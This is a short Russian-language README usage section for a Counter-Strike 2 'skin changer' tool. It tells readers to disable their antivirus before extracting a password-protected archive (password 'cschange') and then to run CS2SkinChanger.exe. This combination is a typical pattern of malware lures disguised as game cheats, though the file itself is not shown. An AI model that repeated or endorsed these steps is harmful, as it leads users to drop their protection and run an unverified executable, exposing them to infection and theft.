
## ⚙️ Использование

### 1. 🛡️ Отключите антивирус

> [!WARNING]
> Перед распаковкой архива рекомендуется временно отключить антивирус, так как некоторые защитные программы могут ошибочно блокировать файлы программы.

### 2. 📦 Распакуйте архив

Скачайте архив с программой и откройте его.

При распаковке будет запрошен пароль.

> [!IMPORTANT]
> **Пароль от архива:** `cschange`

Введите:

```text
cschange
```

После этого распакуйте содержимое архива в любую удобную папку.

### 3. 🚀 Запустите программу

После распаковки откройте папку с программой и запустите:

```text
CS2SkinChanger.exe
```

> ℹ️ **Пароль `cschange` используется только для распаковки архива.**

### 4. 🎮 Запустите Counter-Strike 2

После запуска программы откройте **Counter-Strike 2** и используйте доступные функции инструмента.
